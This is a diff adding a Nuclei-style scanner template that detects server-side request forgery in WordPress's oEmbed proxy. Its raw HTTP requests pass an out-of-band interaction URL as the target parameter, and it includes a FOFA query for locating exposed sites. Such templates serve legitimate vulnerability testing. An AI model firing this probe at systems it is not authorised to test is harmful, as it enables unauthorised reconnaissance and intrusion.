@@ -1,0 +1,35 @@
+id: wordpress-ssrf-oembed
+
+info:
+  name: Wordpress Oembed Proxy - Server-side request forgery
+  author: dhiyaneshDk
+  severity: medium
+  reference:
+    - https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress
+    - https://github.com/incogbyte/quickpress/blob/master/core/req.go
+  metadata:
+    fofa-query: body="oembed" && body="wp-"
+    max-request: 2
+  tags: wordpress,ssrf,oast,oembed
+
+http:
+  - raw:
+      - |
+        GET /wp-json/oembed/1.0/proxy HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - 'rest_missing_callback_param'
+
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
